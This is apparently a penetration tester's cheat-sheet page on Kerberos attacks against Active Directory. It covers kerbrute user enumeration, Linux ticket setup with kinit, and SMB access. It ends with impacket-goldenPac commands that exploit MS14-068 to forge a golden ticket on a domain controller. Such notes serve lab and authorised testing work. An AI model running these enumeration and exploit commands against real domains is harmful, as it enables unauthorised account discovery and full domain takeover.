---
title: "Kerberos"
date: 2024-7-2
tags: ["kerberos", "kerbrute", "active directory", "ad", "domain controller", "Windows", "smb", "MS14-068", "golden ticket", "goldpac"]
---

---
### Kerbrute

[Download kerbrute](https://github.com/ropnop/kerbrute)

```bash
kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10
```

<br>

---

### Generate Kerberos Ticket (From Linux)

```bash
sudo apt install krb5-user cifs-utils
```

```bash
# Step 1: Add domain controller to `/etc/hosts`
10.10.11.10 example.com dc01.example.com dc01

# Step 2: Add domain controller as a DNS server to `/etc/resolv.conf`
nameserver 10.10.11.10

# Step 3: Edit `/etc/krb5.conf`

[libdefaults]
    default_realm = EXAMPLE.COM

[realms]
    example.com = {
        kdc = dc01.example.com:88
        admin_serve = dc01.example.com
        default_domain = example.com
    }
[domain_realm]
    .domain.internal = example.com
    domain.internal = example.com

# Step 4: Sync time to domain controller
ntpdate -s example.com
```

```bash
# Generate kerberos ticket for user: user
kinit user

# Check ticket
klist
```

<br>

---

### Connect to SMB with kerberos

```bash
smbclient -W example.com //DC01/SYSVOL -k
```

<br>

---

### MS14-068 (Forged Golden Ticket)

```bash
# With creds
impacket-goldenPac 'example.com/user:password@dc01'

# With hash
impacket-goldenPac --hashes :hash 'example.com/user@dc01'
```

<br>